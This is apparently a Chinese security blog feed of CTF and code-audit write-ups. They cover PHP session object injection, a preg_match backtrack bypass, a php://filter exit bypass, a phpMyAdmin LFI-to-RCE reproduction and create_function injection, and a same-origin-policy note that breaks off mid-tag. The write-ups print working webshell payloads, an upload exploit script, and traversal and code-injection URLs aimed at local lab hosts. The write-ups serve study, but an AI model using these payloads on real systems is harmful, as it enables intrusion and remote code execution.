    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>1.session序列化反序列化处理器使用不当，主页用php处理器生成session,后端是有<code>php_serialize</code>处理器反序列化<code>session</code>,通过注入 <code>&quot; | &quot;</code> 。任意实例化对象构造POP链。</p><p>2.另一方面，可通过配置不当可造成<code>session</code>被控。当<code>session.upload_progress.enabled</code>打开时，php会记录上传文件的进度，在上传时会将其信息保存在<code>$_SESSION</code>中。详情见<a href="https://bugs.php.net/bug.php?id=71101" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=71101</a><br>难点在于构造出pop链达到自己想要的结果。</p><h1 id="session处理器序列化格式"><a href="#session处理器序列化格式" class="headerlink" title="session处理器序列化格式"></a>session处理器序列化格式</h1><pre><code class="hljs groovy">php name|<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"456"</span>;passwd|<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>php_binary        ^<span class="hljs-string">Dnames:</span><span class="hljs-number">3</span>:<span class="hljs-string">"456"</span>;^<span class="hljs-string">Fpasswds:</span><span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>php_serialize <span class="hljs-string">a:</span><span class="hljs-number">2</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"456"</span>;<span class="hljs-string">s:</span><span class="hljs-number">6</span>:<span class="hljs-string">"passwd"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;&#125;</code></pre><h1 id="session-upload-progress-enabled-session生成"><a href="#session-upload-progress-enabled-session生成" class="headerlink" title="session.upload_progress.enabled session生成"></a>session.upload_progress.enabled session生成</h1><p>在/etc/php5/apache2/php.ini设置</p><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">On</span><span class="hljs-attr">session.upload_progress.cleanup</span> = <span class="hljs-literal">Off</span><span class="hljs-attr">session.upload_progress.name</span> = <span class="hljs-string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="hljs-attr">session.upload_progress.freq</span> =  <span class="hljs-string">"1%"</span><span class="hljs-attr">session.upload_progress.min_freq</span> = <span class="hljs-string">"1"</span></code></pre><p>具体实现参考链接<br><a href="https://secure.php.net/manual/en/session.upload-progress.php" target="_blank" rel="noopener">https://secure.php.net/manual/en/session.upload-progress.php</a><br><a href="https://stackoverflow.com/questions/12071358/how-to-make-php-upload-progress-session-work" target="_blank" rel="noopener">https://stackoverflow.com/questions/12071358/how-to-make-php-upload-progress-session-work</a><br>创建file.php， test.php运行可得如图内容</p><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p>通过phpinfo得知</p><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.enabled</span>=<span class="hljs-literal">On</span> //将上传文件信息进度保存到session中<span class="hljs-attr">session.serialize_handler</span>=php<span class="hljs-attr">session.save_path</span>=/opt/lampp/temp/<span class="hljs-attr">session.upload_progress.name</span>=PHP_SESSION_UPLOAD_PROGRESS</code></pre><p>且生成的session处理器为php_serialize，处理为php。所以我们可以注入 “ | “。造成对象注入</p><p><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p>构造上传文件</p><pre><code class="hljs pgsql">&lt;form action="http://127.0.0.1/session.php" <span class="hljs-keyword">method</span>="POST" enctype="multipart/form-data"&gt; &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>="hidden" <span class="hljs-type">name</span>="&lt;?php echo ini_get("<span class="hljs-keyword">session</span>.upload_progress.name"); ?&gt;" <span class="hljs-keyword">value</span>="123" /&gt; &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>="file" <span class="hljs-type">name</span>="file1" /&gt; &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>="submit" /&gt;&lt;/form&gt;</code></pre><p>运行file.php,抓包将filename修改</p><pre><code class="hljs bash">fillename = |O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";&#125;</code></pre><p>文件执行完毕调用__destruct</p><p><img src="./11.png" srcset="/img/loading.gif" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>session “|” 对象注入主要原理是序列化和反序列化使用的处理不同导致。建立Session使用为php_serialize，而读取时设置的是php处理器。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>preg_match函数绕过</title>
    <link href="/2019/03/24/preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/"/>
    <url>/2019/03/24/preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="pcre回溯"><a href="#pcre回溯" class="headerlink" title="pcre回溯"></a>pcre回溯</h1><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">引用自p神</a><br>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</p><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态<br><code>PHP</code>为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="Codebreaking-pcrewaf（贪婪模式）"><a href="#Codebreaking-pcrewaf（贪婪模式）" class="headerlink" title="Codebreaking-pcrewaf（贪婪模式）"></a>Codebreaking-pcrewaf（贪婪模式）</h1><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>通过本题正则很明显可以看出来是对webshell一句话传入，我们需要绕过正则达到getshell的目的。<br>没什么高级姿势，只能翻看别人的writeup。</p><p>上文中pcre回溯中只要超过<code>pcre.backtrack_limit</code>上限就会抛出error。不满足if(is_php(#data))进而进入else语句文件正常创建。就能在header中看见文件地址</p><h1 id="pcre回溯分析gif"><a href="#pcre回溯分析gif" class="headerlink" title="pcre回溯分析gif"></a>pcre回溯分析gif</h1><p>对&lt;?php phpinfo();//aaaaaa进行实验</p><p>总共14步完成pcre对字符匹配<br><img src="./3.gif" srcset="/img/loading.gif" alt=""></p><p>由于 <code>.*</code>其实一共四步就能匹配到所有字符<br><img src="./4.gif" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs angelscript">但是由于pcre回溯会查找[(\`;?&gt;] 字符，第<span class="hljs-number">5</span>～<span class="hljs-number">12</span>步 从<span class="hljs-comment">//aaaaaa最后一个a往前回溯直到匹配到 " ; "  完成[(\`;?&gt;]中的匹配</span></code></pre><p><img src="./5.gif" srcset="/img/loading.gif" alt=""></p><p>第13～14步 执行最后的<code>.*</code>重新匹配<code>//aaaaaa</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs routeros">import requests<span class="hljs-keyword">from</span> io import BytesIOfiles = &#123;  <span class="hljs-string">'file'</span>: BytesIO(b<span class="hljs-string">'aaa&lt;?php eval($_POST[txt]);//'</span> + b<span class="hljs-string">'a'</span> * 1000000)&#125;res = requests.post(<span class="hljs-string">'http://127.0.0.1:8088/index.php'</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)<span class="hljs-builtin-name">print</span>(res.headers)</code></pre><p><img src="./7.png" srcset="/img/loading.gif" alt=""><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="非贪婪模式下的绕过"><a href="#非贪婪模式下的绕过" class="headerlink" title="非贪婪模式下的绕过"></a>非贪婪模式下的绕过</h1><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>使用<code>union/*aaaaaaaaaaaa*/select</code>匹配正则</p><p>由于<code>?</code>存在，只用匹配一次，之后交给<code>S</code>匹配。如果<code>S</code>不匹配回溯交由<code>?</code>匹配，如此往复。</p><p>这里就存在<code>pcre.backtrack_limit</code>回溯问题。</p><p><a href="https://regex101.com/r/yE6mnT/1/debugger" target="_blank" rel="noopener">正则调试</a><br><img src="./9.gif" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php://filter编码绕过</title>
    <link href="/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"/>
    <url>/2019/03/24/php-filter%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>利用code-breaking学学奇淫技巧</p><h1 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h1><p>以三个字符为一组经过base64加密形成四个字符，如果最后一组不足三个字符，使用0填充形成”=”<br><strong>字符 -&gt; ASCII -&gt; 8bit字节 -&gt; 6bit字节 -&gt; 十进制 -&gt; 对应编码</strong></p><pre><code class="hljs angelscript">            T           o           mASCII:      <span class="hljs-number">84</span>          <span class="hljs-number">111</span>         <span class="hljs-number">109</span><span class="hljs-number">8</span>bit字节:   <span class="hljs-number">01010100</span>    <span class="hljs-number">01101111</span>    <span class="hljs-number">01101101</span><span class="hljs-number">6</span>bit字节:     <span class="hljs-number">010101</span>      <span class="hljs-number">000110</span>      <span class="hljs-number">111101</span>      <span class="hljs-number">101101</span>十进制:     <span class="hljs-number">21</span>          <span class="hljs-number">6</span>           <span class="hljs-number">61</span>          <span class="hljs-number">45</span>对应编码:   V           G           <span class="hljs-number">9</span>           t</code></pre><pre><code class="hljs angelscript">            L           u           c           yASCII:      <span class="hljs-number">76</span>          <span class="hljs-number">117</span>         <span class="hljs-number">99</span>          <span class="hljs-number">121</span><span class="hljs-number">8</span>bit字节:   <span class="hljs-number">01001100</span>    <span class="hljs-number">01110101</span>    <span class="hljs-number">01100011</span>    <span class="hljs-number">01111001</span>      <span class="hljs-number">00000000</span>    <span class="hljs-number">00000000</span><span class="hljs-number">6</span>bit字节:     <span class="hljs-number">010011</span>      <span class="hljs-number">000111</span>      <span class="hljs-number">010101</span>      <span class="hljs-number">100011</span>      <span class="hljs-number">011110</span>  <span class="hljs-number">010000</span>  <span class="hljs-number">000000</span>  <span class="hljs-number">000000</span>十进制:     <span class="hljs-number">19</span>          <span class="hljs-number">7</span>           <span class="hljs-number">21</span>          <span class="hljs-number">35</span>             <span class="hljs-number">30</span>      <span class="hljs-number">16</span>      (异常) (异常)      对应编码:   T           H           V           j               e       Q       =       =</code></pre><h1 id="php-filter编码绕过exit"><a href="#php-filter编码绕过exit" class="headerlink" title="php://filter编码绕过exit"></a>php://filter编码绕过exit</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""><br>如上代码即使写入webshell，也会被exit给shutdown</p><p>献上payload<br><code>http://127.0.0.1/exit.php?filename=php://filter/write=convert.base64-decode/reesource=1.php&amp;content=xPD9waHAgcGhwaW5mbygpOw==</code><br>webshell 前的x是我故意加上去，可以看到exit语句被编码之后形成乱码。<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>接下来分析下缘由，需要写入<code>webshell</code>，但是由于<code>exit</code>的存在，导致<code>getshell</code>失败。这里用到的绕过知识是<code>php</code>中<code>base64_decode</code>只会对<code>[^a-z0-9A-Z+/]</code>解码，而字符<code>&lt;、?、;、&gt;、空格</code>等一共有7个字符不符合<code>base64</code>编码的字符范围将被忽略。所以<code>base64_decode</code>只作用于<code>phpexit</code>,但本题中<code>&lt;?php phpinfo();</code>base64之后为4的倍数，但是拼接<code>phpexit</code>七个字节之后不满足base64解码条件以4个字节为一组解码。所以我们在前面加个字母<code>x</code></p><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h1 id="Codebeaking-phpmagic"><a href="#Codebeaking-phpmagic" class="headerlink" title="Codebeaking-phpmagic"></a>Codebeaking-phpmagic</h1><p><img src="./4.png" srcset="/img/loading.gif" alt=""><br>代码功能主要通过<code>dig -t A -q</code>对输入的<code>domain</code>网址进行dns解析。但是我们的目的是写入shell得到flag。本来想着看是否能够绕过<code>escapeshellarg</code>达到<code>getshell</code>目的，可能太渣没有发现绕过的方法。</p><p>目光转到了写入文件<code>file_put_contents($log_name, $output);</code>很容易想到使用<code>php伪协议</code>，发现log_name是由<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>和<code>$log_name</code>拼接而成。当开启<code>UseCanonicalName=ON</code>和<code>ServerName</code>，可以通过客户端控制。<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p><code>logname</code>被<code>in_array</code>白名单强判断，需要绕过。这里参考<br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a><br>php会对 <code>1.php/.</code> 解析为<code>1.php</code>。且这里<code>1.php/.</code>也能绕过<code>in_array</code>判断</p><p><img src="./6.png" srcset="/img/loading.gif" alt=""><br><code>out_put</code>被<code>htmlspecialchars</code>实体编码直接写入一句话会被转义,这里就可以使用<code>base64一句话木马进行getshell</code>。</p><p>NOTIC:尽量使得<code>webshell</code>满足3的整数倍注意base64之后的一句话不要带有<code>&quot;=&quot;</code> 否则会读取失败</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">456</span>]);<span class="hljs-comment">/*....  =》 PD9waHAgQGV2YWwoJF9HRVRbNDU2XSk7LyouLi4u</span></code></pre><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/data/</span><span class="hljs-number">2</span>ff4fb82e497844a03adf28cf6bedfde<span class="hljs-regexp">/7.php?456=print_r(scandir(%27../</span>..<span class="hljs-regexp">/../</span>%<span class="hljs-number">27</span>));highlight_file(%<span class="hljs-number">27</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/flag_phpmag1c_ur1%27);</span></code></pre><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p><a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpMyAdmin后台LFI-&gt;RCE</title>
    <link href="/2019/03/22/phpMyAdmin%E5%90%8E%E5%8F%B0LFI-RCE/"/>
    <url>/2019/03/22/phpMyAdmin%E5%90%8E%E5%8F%B0LFI-RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现了一波<a href="https://www.freebuf.com/vuls/176064.html" target="_blank" rel="noopener">alphalab</a>师傅针对phpMyAdmin后台从LFI-&gt;RCE 。 发现他对于target白名单的绕过分析存在误点。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><blockquote><p>操作系统：linux<br>php版本：5.6<br>web中间件：Apache2</p></blockquote><h2 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h2><blockquote><p>core类checkPageValidity方法参数引用值操作不当造成LFI-&gt;RCE</p></blockquote><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞触发点在/index.php第12行,target值可控</p><p>触发include文件包含需要满足if四个判断</p><pre><code class="hljs reasonml">&amp;&amp; is<span class="hljs-constructor">_string($<span class="hljs-params">_REQUEST</span>['<span class="hljs-params">target</span>'])</span> <span class="hljs-comment">//1.满足target是字符串类型</span>&amp;&amp; ! preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span>^<span class="hljs-params">index</span><span class="hljs-operator">/</span>', $<span class="hljs-params">_REQUEST</span>['<span class="hljs-params">target</span>'])</span> <span class="hljs-comment">//Target值不是以index开头</span>&amp;&amp; ! <span class="hljs-keyword">in</span><span class="hljs-constructor">_array($<span class="hljs-params">_REQUEST</span>['<span class="hljs-params">target</span>'], $<span class="hljs-params">target_blacklist</span>)</span> <span class="hljs-comment">//Target值不为target_blacklist中的值（'import.php', 'export.php'）</span>&amp;&amp; Core::check<span class="hljs-constructor">PageValidity($<span class="hljs-params">_REQUEST</span>['<span class="hljs-params">target</span>'])</span> <span class="hljs-comment">//Target值满足checkPageValidity方法白名单</span></code></pre><p>前三个判断写死没有利用的价值，主要分析<code>Core</code>类<code>checkPageValidity($_REQUEST[&#39;target&#39;])</code>方法<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>跟进core类<code>checkPageValidity</code>方法,<code>/phpmyadmin/libraries/classes/core.php</code>第443行</p><p>首先对<code>whitelist</code>白名单进行赋值，使用两次<code>mb_substr</code>对<code>$_page</code>即<code>$_REQUEST[&#39;target&#39;]</code>进行截取，并判断<code>$_page</code>是否在白名单中。<br>其实这里有意思的是程序员的本意应该是对<code>$_REQUEST[&#39;target&#39;]</code>进行文件字段截取，但是<code>$page</code><br>引用值在该方法中赋值给了<code>$_page</code>，导致<code>$page</code>被架空。这也是导致<code>LFI</code>被能够被触发的关键点<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用mysql的data文件"><a href="#利用mysql的data文件" class="headerlink" title="利用mysql的data文件"></a>利用mysql的data文件</h2><ol><li><p>在<code>testDB</code>中创建名为<code>abc</code>表，表中字段写入<code>&lt;?php eval($_GET[‘z’]); ?&gt;</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p></li><li><p>路径查询<br>在sql界面输入查询语句<code>show variables like &#39;%datadir%&#39;;</code><br>获取<code>abc</code>表文件路径<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p></li><li><p>在<code>/var/lib/mysql/testdb/abc.frm</code>中成功写入一句话<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p></li><li><p>payload</p></li></ol><p><code>http://127.0.0.1/phpmyadmin/index.php?z=phpinfo();&amp;target=sql.php%253f/../../../../../../var/lib/mysql/testdb/abc.frm</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h2 id="phpMyadmin-session利用"><a href="#phpMyadmin-session利用" class="headerlink" title="phpMyadmin session利用"></a>phpMyadmin session利用</h2><ol><li>在sql界面输入查询语句<code>select “&lt;&gt;php eval($_GET[z]); exit(); ?&gt;”;</code></li></ol><p>(<strong>可在浏览器控制台查看session文件名称</strong>)</p><p>在lamp环境下<code>/var/lib/php5/sessoons//sess_fvov0ts2lgmbqt6j4anb95st5h1e5chu</code> 文件中成功下入一句话木马<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><ol start="2"><li>payload</li></ol><p><code>http://127.0.0.1/phpmyadmin/index.php?z=phpinfo();&amp;target=server_sql.php?/../../../../../var/lib/php5/sessions/sess_fvov0ts2lgmbqt6j4anb95st5h1e5chu</code></p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>create_function任意代码执行</title>
    <link href="/2019/03/18/create-function%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <url>/2019/03/18/create-function%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>一直想把code breaking好好刷一下，虽然吧知道本身能力不足，基本得看看wp。但我认为我能收获的东西却可以很多。通过本节create_function任意代码执行可以在学习下Zend框架,一直认为学好一门语言离不开对源码的分析，这个道理也是在学习java时视频中的老师重复强调的。</p></blockquote><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>需要绕过preg_match对传入$action值首字母限制，将url扔入wfuzz，爆出<code>%5c</code>可以绕过<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p><code>%5c = &#39;\&#39;</code></p><blockquote><p>官方文档解释<br>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p></blockquote><h1 id="create-function函数实现"><a href="#create-function函数实现" class="headerlink" title="create_function函数实现"></a>create_function函数实现</h1><p><code>/php-src@7.1/Zend/zend_builtin_functions.c</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>主要看<code>ZEND</code>框架是怎么构造执行<code>create_function</code>函数，代码第16~35调用宏定义<code>memcp</code>y实现对用户传入参数<code>function_args,function_code</code>进行拼接构造成。</p><pre><code class="hljs arcade"><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__lambda_func</span> (<span class="hljs-params"> function_args </span>) </span>&#123; function_code &#125; \<span class="hljs-number">0</span></code></pre><p>在第38行，函数会被扔到<code>zend_eval_string</code>中执行，相当与php中的eval函数<br>由于代码是简单的拼接</p><p><strong>如果可控在第一个参数，需要闭合圆括号和大括号</strong>：<code>create_function(&#39;){}phpinfo();//&#39;, &#39;&#39;);</code><br><strong>如果可控在第二个参数，需要闭合大括号</strong>：<code>create_function(&#39;&#39;, &#39;}phpinfo();//&#39;);</code></p><h1 id="瞎扯下create-function命名和调用"><a href="#瞎扯下create-function命名和调用" class="headerlink" title="瞎扯下create_function命名和调用"></a>瞎扯下create_function命名和调用</h1><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>根据以上源码可知，可总结<code>create_function</code>命名方式为<br>首字符为 <code>&#39;\0&#39;</code> <strong>(PHP中可以使用chr(0))</strong>，防止php中定义同名函数<br>拼接上<code>lambda_%d</code> 。 <code>%d</code>取决于系统中其他匿名函数<br>所以准确来说create_function构造的函数最后长这样</p><p><code>function  \0lambda_%d( function_args ) { function_code } \0</code></p><p>通过以下代码可以反映源码操作实质<br><code>$func</code>多的一个字符就是 <code>\0</code><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="Exp构造"><a href="#Exp构造" class="headerlink" title="Exp构造"></a>Exp构造</h1><p>官方例子能够反映原生代码执行情况</p><pre><code class="hljs puppet"><span class="hljs-variable">$newfunc</span> = create_function(<span class="hljs-string">'<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>'</span>, <span class="hljs-string">'return "ln(<span class="hljs-variable">$a</span>) + ln(<span class="hljs-variable">$b</span>) = " . log(<span class="hljs-variable">$a</span> * <span class="hljs-variable">$b</span>);'</span>);=&gt;function a(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>)&#123;<span class="hljs-string">'return "ln(<span class="hljs-variable">$a</span>) + ln(<span class="hljs-variable">$b</span>) = " . log(<span class="hljs-variable">$a</span> * <span class="hljs-variable">$b</span>);</span><span class="hljs-string">&#125;</span></code></pre><p><code>create_function</code>是PHP中创建匿名函数的函数，其第一个参数是匿名函数的参数列表，第二个参数是匿名函数的内容。</p><p>在创建函数的时候，PHP会将用户输入的两个参数拼接成一个完整的PHP代码，并使用eval执行。此时，如果对代码进行闭合，即可直接执行任意代码，如：<code>create_function(&#39;$a, $b&#39;, &#39;}phpinfo();//&#39;);</code><br>可以选择 <code>&#39;//&#39; &#39;{&#39;</code>比和后面的大括号</p><pre><code class="hljs lua">create_function(<span class="hljs-string">''</span>,$<span class="hljs-built_in">arg</span>)<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125; print_r(scandir(<span class="hljs-string">'../'</span>));&#123;// <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125; print_r(scandir(<span class="hljs-string">'../'</span>));//&#125;</code></pre><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h2><p><code>http://127.0.0.1:8087/?action=\create_function&amp;arg=return%201;}phpinfo();{</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h2 id="show-source"><a href="#show-source" class="headerlink" title="show_source"></a>show_source</h2><p><code>http://127.0.0.1:8087/?action=\create_function&amp;arg=return%201;}print_r(scandir(%27../%27));show_source(%27../flag_h0w2execute_arb1trary_c0de%27);{</code></p><p><code>show_source</code> 可替换为<code>hightlight_file</code></p><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h2 id="var-dump-file-get-contents"><a href="#var-dump-file-get-contents" class="headerlink" title="var_dump(file_get_contents)"></a>var_dump(file_get_contents)</h2><p><code>http://127.0.0.1:8087/?action=\create_function&amp;arg=return%201;}var_dump(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));{</code></p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p><a href="https://tricking.io/card/34/content" target="_blank" rel="noopener">create_function注入任意代码</a><br><a href="https://phantom9999.github.io/posts/524450fa.html" target="_blank" rel="noopener">PHP内存管理</a><br><a href="https://xiaohuiyugenius.iteye.com/blog/2160612" target="_blank" rel="noopener">PHP 闭包函数</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浏览器同源策略及其规避方法笔记</title>
    <link href="/2019/03/17/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E5%85%B6%E8%A7%84%E9%81%BF%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/03/17/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%8F%8A%E5%85%B6%E8%A7%84%E9%81%BF%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>最近打算深入了解xss,csrf漏洞学习。既然如此，那么同源策略必然是要搞清楚。本章主要讨论的是浏览器同源策略，也可以认为是前端相互调用同源策略。至于前后台调用同源策略的解决主要依赖<code>XMLHttpRequest</code>，具体可以参考<a href="https://segmentfault.com/a/1190000004322487" target="_blank" rel="noopener">你真的会使用XMLHttpRequest吗？</a></p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。<br>最初，它的含义是指，A网页设置的 Cookie，B网页不能打开，除非这两个网页”同源”。所谓”同源”指的是”三个相同”。</p></blockquote><p><strong>协议相同</strong><br><strong>域名相同</strong><br><strong>端口相同</strong></p><p>举例来说，<code>http://sub.eth.space/level/flower.html</code>这个网址，协议是http://，域名是sub.eth.space，端口是80（默认端口可以省略）。它的同源情况如下。<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h2 id="1-2-目的"><a href="#1-2-目的" class="headerlink" title="1.2 目的"></a>1.2 目的</h2><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。<br>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？<br>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。<br>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p><h2 id="1-3-限制范围"><a href="#1-3-限制范围" class="headerlink" title="1.3 限制范围"></a>1.3 限制范围</h2><p>随着互联网的发展，”同源政策”越来越严格。目前，如果非同源，共有三种行为受到限制。</p><blockquote><p>（1） Cookie、LocalStorage 和 IndexDB 无法读取。<br>（2） DOM 无法获得。<br>（3） AJAX 请求不能发送。</p></blockquote><p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。<br><strong><em>同源策略没有禁止脚本的执行，而是禁止读取HTTP回复</em></strong></p><h2 id="1-4具体限制"><a href="#1-4具体限制" class="headerlink" title="1.4具体限制"></a>1.4具体限制</h2><blockquote><p>我们已经知道了，浏览器会根据同源策略允许或拒绝加载某些资源，但是又一个问题由此而生，我们的网站通常会将静态文件（CSS,JS, 图片）等放置在 CDN 上，那么 CDN 与当前域必然是不同源的，但是神奇的是，这些网站可以正常加载出他们需要的资源并展示给用户，这里为什么又不受同源策略的影响呢？<br>再比如在使用XMLHttpRequest的时候，又会因为同源策略的限制无法发出请求，那么到底什么情况下会触发同源策略呢？总体来说，页面跨域的行为主要会分为三类，<br>分别是：</p></blockquote><pre><code class="hljs pgsql"><span class="hljs-keyword">Cross</span>-origin <span 